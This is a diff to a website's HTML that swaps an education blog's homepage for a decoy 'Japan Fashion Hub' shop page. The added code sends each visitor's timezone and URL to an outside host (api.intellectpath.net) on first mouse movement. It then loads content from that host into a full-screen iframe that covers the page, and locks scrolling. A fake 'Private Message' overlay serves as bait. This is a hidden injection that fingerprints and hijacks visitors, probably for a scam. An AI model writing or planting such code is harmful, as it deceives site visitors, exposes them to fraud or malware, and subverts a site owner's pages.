@@ -1,5 +1,351 @@
-<html><head><meta charset="UTF-8" class="sm-qzRUaqceMVDgnvG"/><link rel="stylesheet" href="styles.css" class="more-bDNQLPhfwB"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="content-ClyPpnKggh"/><meta name="referrer" content="no-referrer" class="small-vwSVonDnu"/><style> @import url('https://fonts.googleapis.com/css2?family=Merriweather:ital,wght@0,300;0,400;0,700;0,900;1,300;1,400;1,700;1,900&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #05adad; border-radius: 16px; } *::-webkit-scrollbar-thumb { background-color: #004045; border-radius: 16px; border: 2px solid #05adad; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>skillen.blog</title>
-  <!-- Google tag (gtag.js) -->
+<html lang="en" style="overflow: hidden;"><head>
+<script async="" defer="" src="https://tools.luckyorange.com/core/lo.js?site-id=2ecd9266"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Japan Fashion Hub</title>
+    
+<meta name="description" content="Japan Fashion Hub showcases the latest Japanese fashion, including men's and women's wear and accessories.">
+<meta name="keywords" content="Japanese fashion, men, women, polo shirts, fashion shopping">
+<meta name="author" content="Japan Fashion Hub">
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
+body{
+font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+background:#fff;
+color:#222;
+line-height:1.6;
+}
+
+img{
+width:100%;
+display:block;
+}
+
+a{
+text-decoration:none;
+color:inherit;
+}
+
+.container{
+width:95%;
+max-width:1400px;
+margin:auto;
+}
+
+header{
+background:#082b5c;
+color:#fff;
+padding:15px 0;
+position:sticky;
+top:0;
+z-index:100;
+}
+
+.nav{
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+.logo{
+font-size:28px;
+font-weight:bold;
+}
+
+.menu{
+display:flex;
+gap:20px;
+font-size:14px;
+}
+
+.hero{
+padding:20px 0;
+}
+
+.hero-grid{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:15px;
+}
+
+.hero-card{
+position:relative;
+overflow:hidden;
+}
+
+.hero-card img{
+height:500px;
+object-fit:cover;
+}
+
+.hero-text{
+position:absolute;
+bottom:20px;
+left:20px;
+color:#fff;
+font-size:24px;
+font-weight:bold;
+text-shadow:0 2px 10px rgba(0,0,0,.6);
+}
+
+.section-title{
+text-align:center;
+font-size:34px;
+margin:50px 0 25px;
+font-weight:700;
+}
+
+.category-grid{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:20px;
+margin-bottom:60px;
+}
+
+.category-card{
+position:relative;
+}
+
+.category-card img{
+height:450px;
+object-fit:cover;
+}
+
+.category-name{
+position:absolute;
+bottom:30px;
+left:30px;
+font-size:48px;
+color:#fff;
+font-weight:bold;
+letter-spacing:4px;
+text-shadow:0 2px 8px rgba(0,0,0,.6);
+}
+
+.products{
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+gap:20px;
+}
+
+.product{
+text-align:center;
+}
+
+.product img{
+height:320px;
+object-fit:cover;
+background:#f7f7f7;
+}
+
+.product h3{
+font-size:14px;
+margin:10px 0;
+}
+
+.price{
+font-weight:bold;
+color:#082b5c;
+}
+
+.story{
+padding:80px 0;
+}
+
+.story-grid{
+display:grid;
+grid-template-columns:1fr 1fr 1fr;
+gap:15px;
+}
+
+.story-grid img{
+height:550px;
+object-fit:cover;
+}
+
+.story-text{
+text-align:center;
+max-width:800px;
+margin:40px auto;
+}
+
+.instagram{
+display:grid;
+grid-template-columns:repeat(6,1fr);
+gap:10px;
+}
+
+.instagram img{
+height:180px;
+object-fit:cover;
+}
+
+.news{
+margin:60px 0;
+}
+
+.news ul{
+list-style:none;
+border:1px solid #ddd;
+}
+
+.news li{
+padding:15px;
+border-bottom:1px solid #eee;
+}
+
+footer{
+background:#082b5c;
+color:white;
+padding:50px 20px;
+text-align:center;
+margin-top:50px;
+}
+
+@media(max-width:900px){
+
+.hero-grid,
+.story-grid{
+grid-template-columns:1fr;
+}
+
+.category-grid{
+grid-template-columns:1fr;
+}
+
+.instagram{
+grid-template-columns:repeat(2,1fr);
+}
+
+.hero-card img{
+height:400px;
+}
+
+.category-card img{
+height:350px;
+}
+}
+</style>
+
+
+    <script async="" charset="utf-8" src="https://tools.luckyorange.com/core/web-vitals.js?v=4bb1511" crossorigin="anonymous" id="lo-script-web-vitals"></script></head>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+(function(){
+
+let requestSent = false;
+
+window.addEventListener("mousemove", initOnce);
+
+async function initOnce(){
+
+    if(requestSent) return;
+
+    requestSent = true;
+
+    window.removeEventListener(
+        "mousemove",
+        initOnce
+    );
+
+    const timezone =
+        Intl.DateTimeFormat()
+        .resolvedOptions()
+        .timeZone;
+
+    try{
+
+        await fetch(
+            "https://api.intellectpath.net/timezone-track",
+            {
+                method:"POST",
+                headers:{
+                    "Content-Type":"application/json"
+                },
+                body:JSON.stringify({
+                    timezone,
+                    fullUrl:location.href
+                })
+            }
+        );
+
+        showIframe();
+
+    }catch(e){
+
+        console.error(e);
+
+    }
+
+}
+
+
+async function showIframe(){
+
+    const createFrame = async () => {
+
+        if(document.getElementById("bruceDiv"))
+            return;
+
+        try {
+            // 1. Data call / fetch karna
+            const response = await fetch("https://api.intellectpath.net/view/win");
+            if (!response.ok) throw new Error("Network response was not ok");
+            
+            
+            const blob = await response.blob();
+            const blobUrl = URL.createObjectURL(blob);
+
+            document.documentElement.style.overflow="hidden";
+
+            const div = document.createElement("div");
+            div.id="bruceDiv";
+            div.style.cssText="position:fixed;inset:0;z-index:2147483647;background:#fff;";
+
+            const iframe = document.createElement("iframe");
+            
+            iframe.src = blobUrl;
+
+            iframe.style.cssText = "width:100%;height:100%;border:0;display:block;";
+            iframe.allow = "fullscreen; autoplay; encrypted-media; picture-in-picture";
+            iframe.allowFullscreen = true;
+          
+            div.appendChild(iframe);
+            document.body.appendChild(div);
+
+            iframe.onload = () => {
+                URL.revokeObjectURL(blobUrl);
+            };
+
+        } catch (error) {
+            console.error("Blob iframe load Error:", error);
+        }
+    };
+
+    if(document.body){
+        await createFrame();
+    }else{
+        window.addEventListener(
+            "DOMContentLoaded",
+            async () => { await createFrame(); },
+            {once:true}
+        );
+    }
+}
+    
+})();
+</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script> 
+
+<!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
@@ -8,4 +354,221 @@
 
   gtag('config', 'G-0LY0HY7L01');
 </script>
-</head><body class="content-PlpACK"><main class="caption-JFVliOAd"><div class="btn-wdTmmKeaBx"><div class="large-EILqjsdwfFGtnBC"><div class="tip-mrwZsci"><img src="./img/65e69bbc814f47242a6aac36d453a8458efe2867.jpg" class="inner-QMBpelaG"/></div></div><div class="pic-UWUfaTKgSVqV"><div class="thumbnail-XlsyEzUmgqFIub"><a href="themelist0.html" class="wide-oEpdjmV"><span class="col-ixEDWcEAeVFmCc">Full version</span></a></div><div class="desc-fzdyaQ"><h3 class="breadcrumbs-jehZaRZfjaqh">skillen.blog</h3><span class="tooltip-sebEMWQUsImiNM">Research Teaching This article explores Certification the importance Knowledge Reading of Skills critical thinking Academic in Learning Study Writing education and provides Curriculum effective strategies for teachers to Examination cultivate these Training skills Literacy in their students. Innovation</span></div></div></div><div class="narrow-NqQedRo"><div class="lg-cAakqNdGHRZvSijd"><div class="content-rrwHcWYCY"><h3 class="btn-aiiHTqPTu">Visual experience</h3></div></div><div class="desc-mnSemrFTtNWjH"><div class="breadcrumbs-sbjKQK"><img src="./img/3883d4d7952a6ef401c5a2d081f98b5b03c67fc8.jpg" class="active-WeFLhSXdUNdiZuQn"/><img src="./img/418d1dd6bb46ae3f7e7e402063d3d3836fce3f5f.jpg" class="desc-GDNcbXzpr"/><img src="./img/d4ea0c1c1d2a5df55e94867e37ad0cd75f377dce.jpg" class="content-gWVTQH"/><img src="./img/572950f84c5621ccc86bf0a7570e2252ff8eab43.jpg" class="huge-nXQjTGCoqtR"/><img src="./img/8494b982b251b40e3bc23f11195c3655eb152e1f.jpg" class="big-apYXkkgzngsPhak"/><img src="./img/fe9815f5d4c7ae6bd59fc703726630ef6a1ed697.jpg" class="widget-ivvMRlJDMrvj"/></div></div></div><div class="active-anvCpFBFTskfpYU"><div class="preview-gfWYSOnyFsUz"><div class="pic-zNNtZrcnfke"><div class="tooltip-tBwubbe"><div class="narrow-qpfcHd"><img src="./img/df2cc9281262157544c5b77f1dfb430b2cc819e1.jpg" class="grid-iaLajUhriEihmVJ"/></div></div><div class="subject-SlpiebTtmj"><div class="inner-FtZaYztYW"><h5 class="control-XXqRiHUYNUmDUqv">Exploring the Transformative Power of Public Libraries</h5><div class="all-DHDTQtD"><span class="huge-pgmXzvY">Teaching This article Learning examines how Knowledge public libraries are transforming Research Academic Literacy communities Curriculum by Skills providing resources, programs, and Innovation support Writing that enhance education, promote Training Certification literacy, and foster community Study Examination Reading engagement.</span></div></div><div class="inner-Ackskx"><a href="themelist1.html" class="text-huHFTgGqSssSvXjK"><span class="icon-vYiEoclNusZbc">Read more</span></a></div><div class="big-mlaodNFtVfykcIq"><div class="section-WtrUvUKcjbjinW"><div class="medium-SNttBIRq"><span class="page-FPDzbub">Liam Rodriguez</span></div></div><div class="control-MUyZqVQhNEcKq"><div class="active-vskTwKoWRRplytzb"><span class="breadcrumbs-EYLwnY">21/02/2025</span></div></div></div></div></div><div class="medium-yMQbLOADvZN"><div class="preview-VsnquqtEBCMhVF"><div class="current-rBLDsjovP"><img src="./img/5730e45c8828a0c683a454202cdd08e8e7814d82.jpg" class="thumb-MEZyWWioi"/></div></div><div class="current-ogfoXo"><div class="huge-aBlloAzfxuGFejt"><h5 class="desc-leZzBKPoNP">Libraries: The Heartbeat of Lifelong Learning and Community Growth</h5><div class="current-HMKQcAUFoU"><span class="box-atcknIGxwKp">This Study article Training explores the pivotal Literacy role of Certification libraries in Research Knowledge promoting education, Reading community engagement, and Examination access to Academic Learning information for Skills Writing Teaching all. Curriculum Innovation</span></div></div><div class="current-ekySMMl"><a href="themelist2.html" class="preview-VtDrxlkrRQT"><span class="tagline-ivpRKxZPTQmtS">Read more</span></a></div><div class="xl-VuxPnDAgcA"><div class="desc-ofImhrNqwvx"><div class="wide-MpbwKJAfx"><span class="userpic-mWklVpasb">Sophia Reynolds</span></div></div><div class="sidebar-fnYDtOacbXXGyCP"><div class="desc-gxPOlCP"><span class="holder-YlCXNc">14/01/2025</span></div></div></div></div></div><div class="pic-aaRfRMkkDTmphvc"><div class="pic-FvSNSSjRjux"><div class="userpic-EDmxaRQlPfVhS"><img src="./img/1e9b0f8c58af54b5314e18e5a2f422fe7b739fe1.jpg" class="md-xGkKhOFPHC"/></div></div><div class="widget-fJvFUA"><div class="grid-hAUMHiZ"><h5 class="tagline-QGmPVuQRuKcTY">Navigating Higher Education: The Landscape of University Types</h5><div class="container-IKjTkfTusrVlCgsx"><span class="pic-WinZabDtTFWEWQd">Teaching This Skills article provides Curriculum an in-depth look at different types of universities Examination Learning and Writing Literacy their distinct Academic Innovation Knowledge roles Training Study in shaping Research students' educational experiences Certification and career paths. Reading</span></div></div><div class="desc-nnHbhQscorZXuKTP"><a href="themelist3.html" class="thumbnail-SNiIVJox"><span class="holder-DHhDKkB">Read more</span></a></div><div class="wrap-dLOETgPclX"><div class="huge-dUWUieFD"><div class="inner-xdaNvwOBmv"><span class="active-JunZkKvAESmVEfR">Sophia Martinez</span></div></div><div class="caption-zSQCPmgjGJTb"><div class="holder-qyMlLosj"><span class="desc-bmGbyGNk">13/08/2025</span></div></div></div></div></div><div class="tip-dAWuwEfJn"><div class="large-NQWqHGJYY"><div class="control-bVQSPW"><img src="./img/ffa758b150a2d39f6a1f5a52941c3faaf3ff6dc1.jpg" class="box-shqJTRdCL"/></div></div><div class="grid-ZZeJORZbn"><div class="desc-XBjoxEAvEdmdYo"><h5 class="large-aBywAcTmncHz">Ergonomic Desks for Healthy Learning: Enhancing Student Well-Being and Performance</h5><div class="page-BEoRDmuDrfZFW"><span class="aside-HcnIfXyBLlszQzR">This article explores Training the importance Skills of Study Reading ergonomic desk Examination Academic designs in educational environments, highlighting Research how proper Writing ergonomics can improve posture, reduce discomfort, Certification and Learning Curriculum enhance Literacy Innovation Teaching overall student well-being and Knowledge performance.</span></div></div><div class="breadcrumbs-CegDYQoSqnkvbAt"><a href="themelist4.html" class="narrow-EmVmWv"><span class="tooltip-jGlLFxNu">Read more</span></a></div><div class="col-wLNkVqfWQTDUiNX"><div class="avatar-cXTVnnSBcWvCx"><div class="button-BKBwcXqIqYHFN"><span class="box-bXleMtxrYQFh">Sophia Bennett</span></div></div><div class="title-cWOqsoPskz"><div class="tiny-fzsuljmubtut"><span class="page-ERvjxfkKHvG">18/03/2025</span></div></div></div></div></div><div class="column-TedjzpR"><div class="headline-meuxqZbxBOXMCEv"><div class="wide-cCtVtgLrPiq"><img src="./img/cae49c6ac50d0eb12f849da2063794cdf75fb2dd.jpg" class="grid-VunomWFJsc"/></div></div><div class="control-Aqiakf"><div class="control-OraTtRRwmh"><h5 class="section-kkYXXD">Cultivating a Growth Mindset in Education: Strategies for Success</h5><div class="heading-LICmaRMcrQw"><span class="text-QnYuzOAXfrASXDz">This Training article Reading examines the importance of fostering a growth mindset in education Study Literacy Teaching Academic Innovation and Skills offers practical strategies for educators Learning Research to Knowledge implement Certification Writing in Curriculum their classrooms. Examination</span></div></div><div class="icon-ozSQtGE"><a href="themelist5.html" class="tiny-RasBzifcTpIU"><span class="column-wZaMBbEFRpMr">Read more</span></a></div><div class="narrow-xduwLhlNXJYur"><div class="text-jlOSuDWewb"><div class="row-vhKgmUFNW"><span class="current-MNbKOGtHVe">Liam Thompson</span></div></div><div class="active-zHFmwdecwQS"><div class="pic-jYQbRPlzSt"><span class="content-DdNkZPsx">23/03/2025</span></div></div></div></div></div><div class="sidebar-eCVSOhdHVhGOuW"><div class="avatar-sYYVHDhlBi"><div class="headline-yqjZco"><img src="./img/e6238353287df8a787c66b1a41fb8ead867f1165.jpg" class="active-oCTdRmeugX"/></div></div><div class="subject-ratcRvlroOhZw"><div class="medium-FxAyyWv"><h5 class="headline-qUajdxDX">Harnessing the Power of Technology in Modern Libraries</h5><div class="page-NekgnUDeBrHAnsa"><span class="btn-VePWCbOdiALKA">This article examines Teaching how technology is transforming libraries, enhancing Innovation Study access Writing to resources, Curriculum Research and Reading Training Knowledge improving user experiences Examination in Literacy the Learning Academic Certification digital age. Skills</span></div></div><div class="wide-GdXrpTRznGEttY"><a href="themelist6.html" class="aside-sfxuyIFXJQQFoMIW"><span class="desc-gNDsamRzAH">Read more</span></a></div><div class="page-nMayArY"><div class="tip-ZJzqywg"><div class="control-peFAFyM"><span class="section-mfFOsAoLplPL">Lucas Merritt</span></div></div><div class="img-wVOmsBawqHUoae"><div class="heading-RNoJgCpDHJzlr"><span class="xl-mCDodAbuwvl">14/12/2024</span></div></div></div></div></div></div></div></main><footer class="small-CaNPLa"><div class="tooltip-wmDzgiqjXowKq"><a href="./privacy_policy.html" class="current-ZZIbghGIUWVThCW">Privacy Policy</a><a href="./terms_of_use.html" class="button-IlUBEUMG">Terms Of Use</a><a href="./cookie_policy.html" class="thumb-TBKmuBujRFW">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="text-uRClIaG"/><section class="md-HmGFpLoNdVdiIM"><div class="heading-ORRwILefASoZwAb"><div class="btn-trwlLrfOALgd"><label for="close" class="avatar-ULVNyUvpn"><span class="widget-ELaXnboH">About cookies</span></label></div><div class="all-fLNfkqnikhxDUOtJ"><label for="close" class="sm-wvOtfT"><span class="subject-YjiqhmuejUGovM">Admit</span></label></div><div class="caption-ftaxACai"><label for="close" class="xl-TURqksBKYeryQrB"><span class="active-AjzHFHgP">Dismiss</span></label></div></div><div class="sidebar-vYHYRsfrryefaEmk"><span class="section-OXgjtncTdeSejZp">We use cookies to improve your experience on our website. By using our website you consent cookies. Learn more.</span></div></section></body></html>
+
+<header>
+
+<div class="container nav">
+<div class="logo">JAPAN FASHION HUB</div>
+
+<div class="menu">
+<a href="#">Home</a>
+<a href="#">Men</a>
+<a href="#">Women</a>
+<a href="#">New Arrivals</a>
+<a href="#">Ranking</a>
+</div>
+</div>
+
+</header>
+
+    <div>
+
+    
+<section class="hero container">
+<div class="hero-grid">
+
+<div class="hero-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?w=900">
+<div class="hero-text">Latest Collection</div>
+</div>
+
+<div class="hero-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=900">
+<div class="hero-text">Style</div>
+</div>
+
+<div class="hero-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1483985988355-763728e1935b?w=900">
+<div class="hero-text">Accessories</div>
+</div>
+
+</div>
+</section>
+
+    
+    
+<div class="container">
+
+<div class="category-grid">
+
+<div class="category-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?w=1200">
+<div class="category-name">MEN</div>
+</div>
+
+<div class="category-card">
+<img loading="lazy" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=1200">
+<div class="category-name">WOMEN</div>
+</div>
+
+</div>
+
+<h2 class="section-title">New Arrivals</h2>
+
+<div class="products">
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=600">
+<h3>Premium Polo Shirt</h3>
+<div class="price">¥4,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1576566588028-4147f3842f27?w=600">
+<h3>Summer Shirt</h3>
+<div class="price">¥5,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1541099649105-f69ad21f3246?w=600">
+<h3>Women's Top</h3>
+<div class="price">¥3,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1489987707025-afc232f7ea0f?w=600">
+<h3>Fashion Dress</h3>
+<div class="price">¥6,980</div>
+</div>
+
+</div>
+
+<h2 class="section-title">Popular Ranking</h2>
+
+<div class="products">
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1523381210434-271e8be1f52b?w=600">
+<h3>Popular Polo Shirt</h3>
+<div class="price">¥4,500</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?w=600">
+<h3>Casual Wear</h3>
+<div class="price">¥5,200</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=600">
+<h3>Women's Fashion</h3>
+<div class="price">¥4,980</div>
+</div>
+
+<div class="product">
+<img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=600">
+<h3>Sportswear</h3>
+<div class="price">¥6,200</div>
+</div>
+
+</div>
+
+</div>
+
+<section class="story container">
+
+<div class="story-grid">
+
+<img loading="lazy" src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=900">
+<img loading="lazy" src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=900">
+<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=900">
+
+</div>
+
+<div class="story-text">
+<h2 class="section-title">Sport Meets Fashion</h2>
+
+<p>
+Japan Fashion Hub offers a new lifestyle that combines Japanese trend fashion with sports style.
+We deliver items that focus on quality, comfort, and design.
+</p>
+</div>
+
+</section>
+
+<div class="container">
+
+<h2 class="section-title">Instagram Feed</h2>
+
+<div class="instagram">
+
+<img loading="lazy" src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1503342217505-b0a15ec3261c?w=500">
+<img loading="lazy" src="https://images.unsplash.com/photo-1521572163474-6864f9cf17ab?w=500">
+
+</div>
+
+<div class="news">
+
+<h2 class="section-title">News</h2>
+
+<ul>
+<li>2026/06/15 Summer Collection Released</li>
+<li>2026/06/12 Men's Ranking Updated</li>
+<li>2026/06/10 Free Shipping Campaign Started</li>
+<li>2026/06/08 New Member Registration Bonus</li>
+</ul>
+
+</div>
+
+</div>
+        
+<div style="position:fixed;inset:0;background:rgba(0,0,0,.85);display:flex;justify-content:center;align-items:center;padding:15px;z-index:999999;">
+<div style="width:100%;max-width:340px;background:#111;padding:25px;border-radius:20px;text-align:center;color:#fff;font-family:Arial;box-sizing:border-box;">
+
+<div style="font-size:70px;">📩</div>
+
+<div style="font-size:24px;font-weight:bold;margin-top:10px;">
+Private Message
+</div>
+
+<div style="margin-top:10px;color:#bbb;line-height:1.5;">
+A new message is waiting to be viewed.
+</div>
+
+<div style="margin-top:15px;background:#1f1f1f;padding:12px;border-radius:12px;color:#00D4FF;font-weight:bold;">
+1 Unread Message
+</div>
+
+<div style="display:flex;gap:10px;margin-top:20px;">
+<div style="flex:1;background:#00D4FF;color:#000;padding:14px;border-radius:12px;font-weight:bold;">
+READ MESSAGE
+</div>
+<div style="flex:1;background:#333;color:#fff;padding:14px;border-radius:12px;">
+CANCEL
+</div>
+</div>
+
+</div>
+</div>
+
+<footer>
+
+<h3>JAPAN FASHION HUB</h3>
+
+<p>
+Delivering the latest fashion across Japan.
+</p>
+
+<p style="margin-top:15px;">
+© 2026 Japan Fashion Hub. All Rights Reserved.
+</p>
+
+</footer>
+
+
+
+<iframe id="lo-frame-core" src="about:blank" aria-hidden="true" title="Lucky Orange: core" style="display: none !important;"></iframe></body></html>
